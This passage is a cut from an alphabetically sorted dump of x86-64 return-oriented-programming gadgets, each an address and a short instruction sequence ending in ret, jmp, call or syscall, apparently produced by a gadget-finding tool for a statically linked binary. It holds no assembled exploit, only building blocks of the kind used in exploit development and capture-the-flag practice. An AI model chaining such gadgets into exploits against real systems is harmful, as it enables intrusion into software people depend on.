0x00000000004175f9 : mov eax, dword ptr [rbx + 0x40] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x0000000000451a69 : mov eax, dword ptr [rbx] ; mov qword ptr [rsp + 0x50], rax ; call 0x44dd49
0x0000000000442e44 : mov eax, dword ptr [rcx + 3] ; mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x0000000000442e56 : mov eax, dword ptr [rcx + 5] ; mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x0000000000442e66 : mov eax, dword ptr [rcx + 6] ; mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x0000000000442e76 : mov eax, dword ptr [rcx + 7] ; mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x0000000000442e86 : mov eax, dword ptr [rcx + 8] ; mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x000000000043da5a : mov eax, dword ptr [rcx + rax*4] ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x000000000043f332 : mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x00000000004445d0 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; lea rax, [rdx + 3] ; ret
0x0000000000442e10 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x0000000000444521 : mov eax, dword ptr [rcx] ; mov qword ptr [rdx], rax ; lea rax, [rdx + 7] ; ret
0x0000000000442d71 : mov eax, dword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x00000000004445a1 : mov eax, dword ptr [rcx] ; mov word ptr [rdx], ax ; lea rax, [rdx + 1] ; ret
0x0000000000442df1 : mov eax, dword ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x000000000047cd36 : mov eax, dword ptr [rdi + 0x10] ; add rax, qword ptr [r14] ; call rax
0x0000000000471e4e : mov eax, dword ptr [rdi + 0x10] ; sar rdx, 2 ; sub eax, edx ; ret
0x0000000000418c40 : mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x0000000000418c68 : mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x0000000000490e7d : mov eax, dword ptr [rdi + 0x20] ; test rax, rax ; je 0x490e94 ; call rax
0x0000000000471ff1 : mov eax, dword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x0000000000418f91 : mov eax, dword ptr [rdi + 0x68] ; ret
0x000000000048d2c1 : mov eax, dword ptr [rdi + 0x90] ; ret
0x000000000048d311 : mov eax, dword ptr [rdi + 0x98] ; ret
0x000000000048d351 : mov eax, dword ptr [rdi + 0xa0] ; ret
0x000000000048d3b1 : mov eax, dword ptr [rdi + 0xa8] ; ret
0x000000000048d3a1 : mov eax, dword ptr [rdi + 0xb0] ; ret
0x000000000048d361 : mov eax, dword ptr [rdi + 0xb8] ; ret
0x0000000000460f1f : mov eax, dword ptr [rdi + rax*8] ; jmp rax
0x0000000000487e31 : mov eax, dword ptr [rdi] ; cmp rax, rsi ; je 0x487e48 ; ret
0x0000000000418c35 : mov eax, dword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x0000000000419b31 : mov eax, dword ptr [rdi] ; nop ; mov dword ptr [rip + 0x2a225a], eax ; ret
0x000000000048f615 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x48f627 ; ret
0x000000000048f630 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x48f647 ; ret
0x000000000048f860 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x48f877 ; ret
0x000000000047e81c : mov eax, dword ptr [rdx + 4] ; ret
0x0000000000448ff7 : mov eax, dword ptr [rdx + rax*4] ; sub eax, dword ptr [rdx + rcx*4] ; je 0x448fe9 ; ret
0x000000000043b666 : mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x0000000000418c21 : mov eax, dword ptr [rdx] ; test rax, rax ; jne 0x418c20 ; ret
0x0000000000485620 : mov eax, dword ptr [rip + 0x23729a] ; ret
0x000000000047f51b : mov eax, dword ptr [rip + 0x23ce87] ; mov qword ptr [rsi], rax ; ret
0x000000000047f4aa : mov eax, dword ptr [rip + 0x23cf00] ; ret
0x00000000004582d1 : mov eax, dword ptr [rip + 0x263ba1] ; ret
0x000000000044fdd1 : mov eax, dword ptr [rip + 0x26cb51] ; ret
0x0000000000418f71 : mov eax, dword ptr [rip + 0x2a01a9] ; ret
0x000000000048e202 : mov eax, dword ptr [rsi + 0x10] ; ret
0x000000000048b091 : mov eax, dword ptr [rsi + 0xa8] ; ret
0x000000000048b064 : mov eax, dword ptr [rsi + 0xb0] ; ret
0x000000000048b081 : mov eax, dword ptr [rsi + 0xb8] ; ret
0x000000000048e221 : mov eax, dword ptr [rsi + 8] ; ret
0x000000000046bdcf : mov eax, dword ptr [rsi + rax*8] ; jmp rax
0x0000000000460f69 : mov eax, dword ptr [rsi + rax*8] ; mov esi, 1 ; jmp rax
0x00000000004615c9 : mov eax, dword ptr [rsi + rax*8] ; xor esi, esi ; jmp rax
0x000000000047105f : mov eax, dword ptr [rsi] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000048d386 : mov eax, dword ptr [rsp + 0x10] ; add rsp, 0x28 ; ret
0x000000000044b136 : mov eax, dword ptr [rsp + 0x10] ; call rax
0x0000000000401233 : mov eax, dword ptr [rsp + 0x18] ; call rax
0x00000000004539dc : mov eax, dword ptr [rsp + 0x20] ; call rax
0x000000000044a52a : mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x10 ; pop rbx ; ret
0x000000000044a4ad : mov eax, dword ptr [rsp + 0xc] ; jne 0x44a482 ; neg eax ; jmp 0x44a482
0x000000000040e01d : mov eax, dword ptr [rsp + 8] ; call rax
0x0000000000486dbf : mov eax, dword ptr [rsp] ; add rax, qword ptr [rdx + 8] ; call rax
0x000000000048aafa : mov eax, dword ptr [rsp] ; add rsp, 0x38 ; ret
0x000000000047fe48 : mov eax, dword ptr fs:[rax] ; ret
0x000000000041b1e0 : mov eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000046f983 : mov eax, eax ; jmp 0x46f955
0x000000000044a179 : mov eax, eax ; mov rsi, rbp ; mov edi, ebx ; xor eax, eax ; syscall
0x0000000000422fbf : mov eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000448b02 : mov eax, eax ; ret
0x0000000000474d84 : mov eax, eax ; shr rax, 2 ; vzeroupper ; ret
0x0000000000449942 : mov eax, eax ; syscall
0x0000000000473bc1 : mov eax, eax ; vzeroupper ; ret
0x0000000000410a8b : mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000044bb14 : mov eax, ebp ; pop rbx ; pop rbp ; jmp rax
0x0000000000410ba3 : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041065e : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000412522 : mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000041304d : mov eax, ebp ; syscall
0x00000000004845b3 : mov eax, ebx ; adc rax, rdx ; pop rbp ; pop rbx ; ret
0x00000000004885a7 : mov eax, ebx ; jne 0x4885c5 ; add rsp, 0x40 ; pop rbx ; ret
0x000000000048868e : mov eax, ebx ; jne 0x4886ad ; add rsp, 0x50 ; pop rbx ; ret
0x0000000000410d88 : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000414fc5 : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044ad50 : mov eax, ebx ; pop rbx ; pop rbp ; ret
0x000000000041333b : mov eax, ebx ; pop rbx ; ret
0x0000000000484477 : mov eax, ecx ; adc eax, eax ; ret
0x0000000000465f75 : mov eax, ecx ; ret
0x000000000040dc7b : mov eax, ecx ; syscall
0x0000000000413233 : mov eax, edi ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041b475 : mov eax, edi ; pop rbp ; pop r12 ; ret
0x0000000000413264 : mov eax, edi ; ret
0x000000000041b075 : mov eax, edx ; add rsp, 8 ; ret
0x0000000000410ef0 : mov eax, edx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046603e : mov eax, edx ; pop rbp ; pop r12 ; ret
0x0000000000410f99 : mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000410931 : mov eax, edx ; pop rbx ; pop rbp ; ret
0x0000000000448b06 : mov eax, edx ; pop rbx ; ret
0x000000000041b081 : mov eax, edx ; ret
0x000000000040132a : mov eax, edx ; syscall
0x0000000000482827 : mov eax, esi ; mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
0x000000000041450a : mov eax, esi ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000046fcb4 : mov eax, esi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041e53d : mov eax, esi ; pop rbx ; ret
0x000000000041e571 : mov eax, esi ; ret
0x0000000000449932 : mov eax, esi ; syscall
0x000000000046ede8 : mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041304c : mov eax, r13d ; syscall
0x000000000046f982 : mov eax, r8d ; jmp 0x46f956
0x0000000000449941 : mov eax, r8d ; syscall
0x0000000000465f74 : mov eax, r9d ; ret
0x0000000000412dee : mov eax, r9d ; syscall
0x00000000004a8df4 : mov ebp, 0x63b1101 ; rcl qword ptr [r14 + 0x27], cl ; retf 0xc0fe
0x00000000004944ad : mov ebp, 0xbef0fff9 ; stc ; jmp rax
0x00000000004945b1 : mov ebp, 0xbf10fff9 ; stc ; call qword ptr [rax]
0x000000000049f464 : mov ebp, 0xc000000f ; sldt word ptr [rax] ; ret
0x00000000004a63bd : mov ebp, 0xc1c0bfbe ; ret 0xc4c3
0x0000000000473388 : mov ebp, 0xf80148c0 ; ret
0x000000000047360c : mov ebp, 0xf80148c6 ; ret
0x00000000004a7b26 : mov ebp, 0xfb67d10d ; ret
0x00000000004692be : mov ebp, 0xfffff730 ; call rax
0x000000000045dd8c : mov ebp, 0xfffff758 ; call rax
0x000000000046c2b9 : mov ebp, 0xfffffae8 ; add byte ptr [rcx - 0x77], al ; ret 0x1674
0x0000000000465195 : mov ebp, 0xffffff40 ; call rax
0x0000000000413047 : mov ebp, 0xffffff7c ; mov eax, r13d ; syscall
0x000000000048d7e3 : mov ebp, dword ptr [rbp] ; mov rsp, rcx ; ret
0x00000000004004cb : mov ebp, dword ptr [rbx] ; add byte ptr [rsi - 0x70], ah ; ret
0x0000000000410c46 : mov ebp, dword ptr [rdx] ; add byte ptr [rax - 0x77], cl ; ret
0x000000000048ea2a : mov ebp, dword ptr [rsp + 8] ; jmp 0x48ea48
0x000000000046ff49 : mov ebp, eax ; jmp 0x46ff12
0x000000000047e536 : mov ebp, eax ; jmp 0x47e507
0x000000000048282d : mov ebp, ecx ; nop ; jmp rdx
0x000000000047fe28 : mov ebx, 0x10023a3 ; pop rbx ; ret
0x00000000004a8b44 : mov ebx, 0x1b5c347e ; jmp 0x4a8b1c
0x0000000000435887 : mov ebx, 0x46f00ff2 ; retf
0x00000000004303e4 : mov ebx, 0x4e6f0ff3 ; retf
0x0000000000430402 : mov ebx, 0x4f7f0ff3 ; retf
0x0000000000424941 : mov ebx, 0x854dfffd ; test byte ptr [rdi], 0x84 ; ret
0x00000000004560d4 : mov ebx, 0x8941fffa ; ret 0x5be9
0x000000000040489f : mov ebx, 0x8949ffff ; ret 0x149
0x000000000044c704 : mov ebx, 0xafb8341 ; je 0x44c713 ; ret
0x00000000004944c9 : mov ebx, 0xbcf0fff9 ; stc ; call rax
0x00000000004945ad : mov ebx, 0xbd40fff9 ; stc ; call qword ptr [rax]
0x00000000004a63bb : mov ebx, 0xbfbebdbc ; rol cl, 0xc2 ; ret
0x000000000042510b : mov ebx, 0xf480001 ; ret 0x66c3
0x000000000040f50c : mov ebx, 1 ; jmp 0x40f4db
0x000000000040fc44 : mov ebx, 1 ; jmp 0x40fc13
0x00000000004a9164 : mov ebx, dword ptr [rdx] ; retf 0x7272
0x000000000045ae66 : mov ebx, edi ; test rax, rax ; je 0x45ae76 ; call rax
0x0000000000475500 : mov ebx, esi ; sub rsp, 8 ; syscall
0x000000000047fb9d : mov ebx, esp ; mov rsi, rbx ; syscall
0x00000000004b09b4 : mov ebx, ss ; stc ; jmp qword ptr [rdx]
0x000000000040dc76 : mov ecx, 0x27 ; mov eax, ecx ; syscall
0x00000000004757bc : mov ecx, 0x48000000 ; add esp, 0x78 ; ret
0x00000000004a6ff9 : mov ecx, 0x5b92ac50 ; retf
0x00000000004a8ace : mov ecx, 0x7ce1a201 ; pop rdx ; leave ; retf
0x0000000000404a7c : mov ecx, 0x8949ffff ; ret 0x149
0x00000000004944e5 : mov ecx, 0xbaf0fff9 ; stc ; call rax
0x00000000004944a5 : mov ecx, 0xbb30fff9 ; stc ; call qword ptr [rax]
0x0000000000494485 : mov ecx, 0xbb40fff9 ; stc ; jmp qword ptr [rax]
0x00000000004a63b9 : mov ecx, 0xbdbcbbba ; mov esi, 0xc2c1c0bf ; ret
0x0000000000475a20 : mov ecx, 0xc ; mov eax, ecx ; syscall
0x000000000046be0d : mov ecx, 1 ; jmp rax
0x0000000000438e5c : mov ecx, dword ptr [rcx - 4] ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x000000000042e20e : mov ecx, dword ptr [rdi - 0x73] ; or al, 0xb ; jmp r9
0x0000000000471fcb : mov ecx, dword ptr [rdx + 0x48] ; cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x000000000043b663 : mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00000000004a8f84 : mov ecx, dword ptr [rsi + rdi*2 + 0xaaed8a9] ; jne 0x4a8fb9 ; retf 0x32dd
0x0000000000430583 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000430783 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000430983 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000444aa0 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x0000000000444ae1 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x0000000000435ff3 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x0000000000435f83 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x0000000000435f13 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x0000000000435e35 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435dc5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435d55 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435ce5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435c75 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435c05 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435b95 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x00000000004360d5 : mov ecx, dword ptr [rsi] ; mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x0000000000444a81 : mov ecx, dword ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x0000000000481cd7 : mov ecx, dword ptr [rsp + 0x40] ; add rsp, 0x48 ; jmp qword ptr [rax]
0x0000000000481c65 : mov ecx, dword ptr [rsp + 0x40] ; add rsp, 0x58 ; jmp qword ptr [rax]
0x0000000000472601 : mov ecx, eax ; jmp 0x4725cb
0x000000000044f0cb : mov ecx, ebp ; call rbx
0x00000000004afc81 : mov ecx, edi ; call qword ptr [rbx]
0x00000000004afc59 : mov ecx, edi ; call qword ptr [rdx]
0x0000000000417a20 : mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x0000000000447862 : mov ecx, edx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000417a5a : mov ecx, edx ; xor edx, edx ; jmp rax
0x0000000000474385 : mov ecx, esi ; call rbx
0x000000000048c68c : mov edi, 0x148015b ; retf
0x000000000042e1e4 : mov edi, 0x39480028 ; retf 0x8949
0x000000000045f5da : mov edi, 0x440f48c0 ; ret 0xae9
0x000000000044c8e2 : mov edi, 0x563d8b48 ; jmp qword ptr [rsi]
0x0000000000400a8c : mov edi, 0x6babd0 ; jmp rax
0x0000000000494491 : mov edi, 0xc100fff9 ; stc ; inc dword ptr [rax] ; ret
0x00000000004945b5 : mov edi, 0xc110fff9 ; stc ; call qword ptr [rax]
0x0000000000494595 : mov edi, 0xc160fff9 ; stc ; jmp qword ptr [rax - 0x3d]
0x0000000000494555 : mov edi, 0xc1e0fff9 ; stc ; jmp rax
0x00000000004039ce : mov edi, 0xdf8948ff ; call 0x4004c7
0x0000000000449fc4 : mov edi, 0xffffff9c ; syscall
0x000000000048d016 : mov edi, 1 ; call r14
0x000000000048cf6c : mov edi, 1 ; call rax
0x000000000048dcdc : mov edi, 1 ; jmp rax
0x000000000040eab4 : mov edi, dword ptr [rax + 0x20] ; call rdx
0x000000000044b56c : mov edi, dword ptr [rbp - 0x58] ; mov r12d, r14d ; call r15
0x0000000000413046 : mov edi, dword ptr [rbp - 0x84] ; mov eax, r13d ; syscall
0x000000000045dd8b : mov edi, dword ptr [rbp - 0x8a8] ; call rax
0x00000000004692bd : mov edi, dword ptr [rbp - 0x8d0] ; call rax
0x0000000000465194 : mov edi, dword ptr [rbp - 0xc0] ; call rax
0x000000000048d661 : mov edi, dword ptr [rbp - 8] ; leave ; ret
0x000000000044b054 : mov edi, dword ptr [rbp] ; call r12
0x000000000040e019 : mov edi, dword ptr [rbp] ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000044b02e : mov edi, dword ptr [rbx] ; call r12
0x000000000047c91f : mov edi, dword ptr [rbx] ; mov rax, qword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000047f4f6 : mov edi, dword ptr [rdi + 8] ; test rdi, rdi ; jne 0x47f4d9 ; ret
0x00000000004a7de6 : mov edi, dword ptr [rdx] ; ret
0x000000000048847f : mov edi, dword ptr [rsp + 0x10] ; call 0x484eb6
0x000000000048ef3e : mov edi, dword ptr [rsp + 0x10] ; call r14
0x000000000047581e : mov edi, dword ptr [rsp + 0x18] ; mov eax, 0x101 ; syscall
0x0000000000482704 : mov edi, dword ptr [rsp + 0x18] ; mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x00000000004517a5 : mov edi, dword ptr [rsp + 0x20] ; call r15
0x0000000000451670 : mov edi, dword ptr [rsp + 0x20] ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x0000000000452081 : mov edi, dword ptr [rsp + 0x30] ; call r14
0x0000000000452259 : mov edi, dword ptr [rsp + 0x30] ; call rbx
0x0000000000452543 : mov edi, dword ptr [rsp + 0x38] ; call r12
0x0000000000452b7b : mov edi, dword ptr [rsp + 0x38] ; call r14
0x0000000000455b3f : mov edi, dword ptr [rsp + 0x38] ; call r15
0x0000000000451d89 : mov edi, dword ptr [rsp + 0x38] ; call rbx
0x0000000000451a95 : mov edi, dword ptr [rsp + 0x38] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x0000000000453fba : mov edi, dword ptr [rsp + 0x40] ; call r15
0x0000000000456766 : mov edi, dword ptr [rsp + 0x40] ; call rbx
0x00000000004539d7 : mov edi, dword ptr [rsp + 0x40] ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x000000000044a3d1 : mov edi, dword ptr [rsp + 0xc] ; mov eax, 0x48 ; syscall
0x000000000040122e : mov edi, dword ptr [rsp + 0xc] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000041762b : mov edi, dword ptr [rsp + 8] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x000000000044b131 : mov edi, dword ptr [rsp + 8] ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x0000000000416f36 : mov edi, dword ptr [rsp] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000048de2c : mov edi, dword ptr [rsp] ; mov rdx, qword ptr [rbp] ; call r12
0x000000000044934a : mov edi, eax ; call 0x4004b0
0x0000000000423e24 : mov edi, eax ; call rcx
0x000000000042416c : mov edi, eax ; jmp 0x40043c
0x000000000040dc80 : mov edi, eax ; mov eax, 0xba ; syscall
0x00000000004741f8 : mov edi, ebp ; add r15, r12 ; call 0x400497
0x0000000000468aa0 : mov edi, ebp ; call 0x4004b1
0x0000000000422343 : mov edi, ebp ; call 0x41e584
0x0000000000450334 : mov edi, ebp ; call 0x458fe9
0x0000000000489b9e : mov edi, ebp ; call qword ptr [r14]
0x00000000004019ce : mov edi, ebp ; call qword ptr [r15 + rbx*8]
0x0000000000489c72 : mov edi, ebp ; call qword ptr [rax]
0x0000000000489d4e : mov edi, ebp ; call qword ptr [rcx]
0x0000000000458a9c : mov edi, ebp ; call r12
0x000000000048ed1c : mov edi, ebp ; call r14
0x00000000004231a6 : mov edi, ebp ; call rax
0x0000000000474231 : mov edi, ebp ; call rbx
0x000000000044ae4a : mov edi, ebp ; mov eax, 9 ; syscall
0x0000000000412dec : mov edi, ebp ; mov eax, r9d ; syscall
0x0000000000474382 : mov edi, ebp ; mov r9, r14 ; call rbx
0x000000000040e0a9 : mov edi, ebp ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000045d622 : mov edi, ebx ; call 0x400440
0x00000000004039d1 : mov edi, ebx ; call 0x4004c4
0x000000000044f3ce : mov edi, ebx ; call r14
0x0000000000413c16 : mov edi, ebx ; call rax
0x000000000044a24e : mov edi, ebx ; mov eax, 1 ; syscall
0x000000000044a50c : mov edi, ebx ; mov edx, eax ; mov eax, 3 ; syscall
0x0000000000416fcd : mov edi, ebx ; pop rbx ; pop rbp ; jmp rax
0x0000000000470edf : mov edi, ebx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x000000000044a17e : mov edi, ebx ; xor eax, eax ; syscall
0x00000000004afcd1 : mov edi, ecx ; call qword ptr [rbx]
0x0000000000409f2a : mov edi, edi ; call 0x4209c8
0x0000000000472358 : mov edi, edi ; call r12
0x0000000000411b43 : mov edi, edi ; call rax
0x000000000044f9ab : mov edi, edi ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x00000000004848f1 : mov edi, edx ; mov byte ptr [rsi], al ; jne 0x4848d9 ; mov rax, rsi ; ret
0x0000000000449930 : mov edi, edx ; mov eax, esi ; syscall
0x000000000044993f : mov edi, edx ; mov eax, r8d ; syscall
0x0000000000414247 : mov edi, esi ; call 0x4004ac
0x0000000000458bf3 : mov edi, esi ; call rbx
0x0000000000458ed1 : mov edi, esi ; call rdx
0x000000000041d8c1 : mov edi, esi ; mov dword ptr [rsp + 8], r10d ; call 0x419b69
0x000000000048dd34 : mov edi, esp ; call r15
0x0000000000472080 : mov edi, esp ; call rbx
0x00000000004057c9 : mov edi, esp ; jmp 0x40579a
0x000000000044a639 : mov edi, esp ; mov eax, 0x4f ; syscall
0x0000000000412deb : mov edi, r13d ; mov eax, r9d ; syscall
0x0000000000448a06 : mov edx, 0 ; cmove rax, rdx ; pop rbx ; ret
0x00000000004133b6 : mov edx, 0x130 ; pop rbx ; ret
0x0000000000435807 : mov edx, 0x46f00ff2 ; retf 0xff3
0x00000000004305e4 : mov edx, 0x4e6f0ff3 ; retf 0x8b4c
0x0000000000430602 : mov edx, 0x4f7f0ff3 ; retf 0x894c
0x000000000044c576 : mov edx, 0x64 ; test eax, eax ; cmove eax, edx ; ret
0x00000000004555ce : mov edx, 0x89fffff3 ; retf 0xe283
0x0000000000494569 : mov edx, 0xbbf0fff9 ; stc ; call rax
0x0000000000494549 : mov edx, 0xbc30fff9 ; stc ; call qword ptr [rax]
0x00000000004a729e : mov edx, 0xcac982a4 ; call 0xffffffffaf0d111e
0x0000000000490242 : mov edx, 0xe1750022 ; pop rbx ; ret
0x000000000048bea1 : mov edx, 0xfc0c7 ; add byte ptr [rax], al ; syscall
0x0000000000451447 : mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x000000000047e79c : mov edx, 1 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00000000004851e0 : mov edx, 5 ; jmp 0x401c37
0x000000000045b6e4 : mov edx, 8 ; mov eax, ecx ; syscall
0x0000000000458eca : mov edx, dword ptr [rbp - 0x98] ; mov rdi, r14 ; call rdx
0x000000000048de30 : mov edx, dword ptr [rbp] ; call r12
0x0000000000484f59 : mov edx, dword ptr [rbx + 0x18] ; mov qword ptr [rdx], rax ; pop rbx ; ret
0x000000000043f32f : mov edx, dword ptr [rcx + rdx*4] ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x000000000043da5d : mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x0000000000484f6d : mov edx, dword ptr [rdi + 0x30] ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x000000000048ed19 : mov edx, dword ptr [rdi] ; mov rdi, r13 ; call r14
0x0000000000444ac2 : mov edx, dword ptr [rsi + 3] ; mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x0000000000444ab3 : mov edx, dword ptr [rsi + 4] ; mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x0000000000444b03 : mov edx, dword ptr [rsi + 7] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x0000000000444b13 : mov edx, dword ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x000000000042ffc1 : mov edx, dword ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x0000000000430380 : mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042fc11 : mov edx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x00000000004450b0 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, [rdi + 3] ; ret
0x0000000000436060 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x0000000000445101 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, [rdi + 7] ; ret
0x0000000000435ea1 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x0000000000445091 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; lea rax, [rdi + 1] ; ret
0x0000000000444a71 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x0000000000482709 : mov edx, dword ptr [rsp + 0x10] ; call rdx
0x000000000048cf69 : mov edx, dword ptr [rsp] ; mov edi, 1 ; call rax
0x0000000000423e29 : mov edx, eax ; jmp 0x423ddc
0x0000000000456cba : mov edx, eax ; jmp 0x456c71
0x0000000000456df1 : mov edx, eax ; jmp 0x456db0
0x00000000004570bf : mov edx, eax ; jmp 0x457076
0x0000000000457136 : mov edx, eax ; jmp 0x4570ed
0x000000000046f4e2 : mov edx, eax ; jmp 0x46f4b0
0x0000000000475f6e : mov edx, eax ; jmp 0x475f62
0x000000000040dc8c : mov edx, eax ; mov eax, 0xea ; syscall
0x000000000044a50e : mov edx, eax ; mov eax, 3 ; syscall
0x000000000041427e : mov edx, ebp ; add rbp, r13 ; call 0x4004af
0x0000000000489b99 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [r14]
0x0000000000489c6d : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000489d49 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000489b53 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000475710 : mov edx, ecx ; mov eax, 0x106 ; syscall
0x000000000044c5f1 : mov edx, ecx ; mov eax, 0x19 ; syscall
0x0000000000448528 : mov edx, edi ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x000000000040e2c9 : mov edx, esp ; call 0x40df68
0x000000000047597d : mov edx, esp ; mov esi, 0x5401 ; mov eax, ecx ; syscall
0x000000000040dc8b : mov edx, r8d ; mov eax, 0xea ; syscall
0x0000000000456569 : mov es, edx ; add eax, 0x29480000 ; ret 0x349
0x0000000000453ab2 : mov es, word ptr [rax + rax] ; add bh, dh ; ret 0
0x0000000000475b49 : mov es, word ptr [rbx] ; add al, 0x11 ; ret
0x000000000046add5 : mov es, word ptr [rbx] ; add byte ptr [rcx - 0x77], al ; retf
0x000000000042e245 : mov esi, 0x39480028 ; retf 0x8949
